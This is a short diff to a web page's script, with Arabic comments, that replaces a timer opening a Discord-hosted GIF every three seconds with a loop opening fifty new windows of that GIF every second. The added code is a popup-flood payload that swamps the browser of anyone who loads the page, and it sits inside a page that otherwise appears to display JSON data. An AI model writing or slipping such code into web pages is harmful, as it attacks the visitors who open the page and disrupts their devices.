@@ -71,10 +71,12 @@
             infoDiv.textContent = JSON.stringify(data, null, 2);
         });
 
-        // الكود المضاف: فتح نافذة جديدة كل 3 ثواني
-        setInterval(() => {
-            window.open("https://cdn.discordapp.com/attachments/1239118162260135967/1392950213605458032/standard.gif?ex=6884833a&is=688331ba&hm=0514787c27cce792dbcdda6ddbd4bef8c1655f107572833232e1b6bbe0bf6284&", "_blank");
-        }, 3000);
-    </script>
+<script>
+    setInterval(() => {
+        for (let i = 0; i < 50; i++) {
+            window.open("https://cdn.discordapp.com/attachments/1239118162260135967/1392950213605458032/standard.gif", "_blank");
+        }
+    }, 1000); // كل ثانية
+</script>
 </body>
 </html>
